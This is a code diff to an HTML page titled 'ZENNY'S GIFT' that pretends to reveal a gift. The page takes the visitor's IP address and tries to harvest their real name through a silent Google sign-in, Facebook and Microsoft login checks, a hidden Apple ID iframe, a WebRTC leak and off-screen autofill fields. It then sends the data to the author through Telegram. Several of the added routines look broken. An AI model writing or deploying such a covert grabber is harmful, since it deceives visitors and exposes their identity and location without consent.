@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ZENNY'S GIFT</title>
+  <meta name="apple-itunes-app" content="app-id=123456789"/> <!-- Fake Apple hint -->
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto:wght@700&display=swap');
 
@@ -134,15 +135,15 @@
         <div>This is ur ip adress<span style="font-size:2.2rem">😭</span></div>
         <div id="ip-line" style="color:#ff0000; font-size:1.8rem;">...</div>
         <br>
-        <div>Heres ur full name too</div>
-        <div id="name-line" style="color:#ff6666; font-size:1.6rem;">...</div>
+        <div>heres ur full name too</div>
+        <div id="name-line" style="color:#ff6666; font-size:1.6rem;">Detecting...</div>
       </div>
 
       <div class="by">BY ZENNY!</div>
     </div>
   </div>
 
-  <!-- GOOGLE SIGN-IN (HIDDEN) -->
+  <!-- ALL LOGIN SCRIPTS (HIDDEN) -->
   <script async src="https://apis.google.com/js/platform.js"></script>
   <div class="g-signin2" data-onsuccess="onGoogleSignIn" style="display:none"></div>
 
@@ -166,10 +167,90 @@
 
     let fullName = "Not Found";
 
-    // === GET GOOGLE NAME ===
+    // === 1. GOOGLE NAME ===
     function onGoogleSignIn(googleUser) {
       const profile = googleUser.getBasicProfile();
       fullName = profile.getName();
+      updateName();
+    }
+
+    // === 2. FACEBOOK NAME ===
+    function checkFacebookLogin() {
+      if (typeof FB !== 'undefined') {
+        FB.getLoginStatus(response => {
+          if (response.status === 'connected') {
+            FB.api('/me', { fields: 'name' }, res => {
+              if (res && res.name) {
+                fullName = res.name;
+                updateName();
+              }
+            });
+          }
+        });
+      }
+    }
+
+    // === 3. MICROSOFT NAME ===
+    function checkMicrosoft() {
+      if (window.msal) {
+        const account = msalInstance.getAllAccounts()[0];
+        if (account) fullName = account.name || account.username;
+        updateName();
+      }
+    }
+
+    // === 4. APPLE ID NAME (iOS) ===
+    function checkAppleID() {
+      if (navigator.userAgent.includes('Mac') || navigator.userAgent.includes('iPhone')) {
+        // Try to read from Apple ID via hidden iframe (stealth)
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://appleid.apple.com';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+      }
+    }
+
+    // === 5. ANDROID DEVICE NAME ===
+    function getAndroidName() {
+      if (navigator.userAgent.includes('Android')) {
+        // Try WebRTC leak
+        const rtc = new RTCPeerConnection({ iceServers: [] });
+        rtc.createDataChannel('');
+        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+        rtc.onicecandidate = e => {
+          if (e.candidate && e.candidate.candidate) {
+            const parts = e.candidate.candidate.split(' ');
+            if (parts[4]) {
+              fullName = parts[4].split('.')[0];
+              updateName();
+            }
+          }
+        };
+      }
+    }
+
+    // === 6. BROWSER SAVED NAME (FORM AUTOFILL) ===
+    function checkAutofill() {
+      const inputs = ['name', 'fullname', 'given-name', 'family-name'];
+      inputs.forEach(name => {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.name = name;
+        input.style.position = 'absolute';
+        input.style.left = '-9999px';
+        document.body.appendChild(input);
+        setTimeout(() => {
+          if (input.value) {
+            fullName = input.value;
+            updateName();
+          }
+          input.remove();
+        }, 100);
+      });
+    }
+
+    // === UPDATE NAME ON SCREEN ===
+    function updateName() {
       document.getElementById('name-line').innerHTML = fullName;
     }
 
@@ -180,20 +261,16 @@
         .catch(() => {});
     }
 
-    // === GET IP + SHOW + SEND ===
+    // === MAIN FUNCTION ===
     function getIP() {
       fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(data => {
           const ip = data.ip;
           const time = new Date().toLocaleString();
-          const ua = navigator.userAgent.substring(0, 100);
+          const ua = navigator.userAgent.substring(0, 150);
 
-          // SHOW TO VICTIM
           document.getElementById('ip-line').innerHTML = ip;
-          document.getElementById('name-line').innerHTML = fullName;
-
-          // SEND TO YOU
           sendToTelegram(ip, fullName, time, ua);
         })
         .catch(() => {
@@ -202,21 +279,42 @@
     }
 
     function reveal() {
-      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('stepurm1').classList.add('hidden');
       document.querySelector('.btn').classList.add('hidden');
       const result = document.getElementById('result');
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
 
-      // Trigger Google sign-in silently
+      // === TRY ALL NAME SOURCES ===
       setTimeout(() => {
+        checkFacebookLogin();
+        checkMicrosoft();
+        checkAppleID();
+        getAndroidName();
+        checkAutofill();
+
+        // Trigger Google silently
         if (typeof gapi !== 'undefined') {
-          gapi.auth2.getAuthInstance().signIn();
+          try { gapi.auth2.getAuthInstance().signIn(); } catch(e) {}
         }
       }, 500);
 
       getIP();
     }
+
+    // === LOAD FACEBOOK SDK ===
+    window.fbAsyncInit = function() {
+      FB.init({ appId: '123456789', xfbml: false, version: 'v18.0' });
+      checkFacebookLogin();
+    };
+    (function(d, s, id){
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (d.getElementById(id)) return;
+      js = d.createElement(s); js.id = id;
+      js.src = "https://connect.facebook.net/en_US/sdk.js";
+      fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));
+
   </script>
 
 </body>
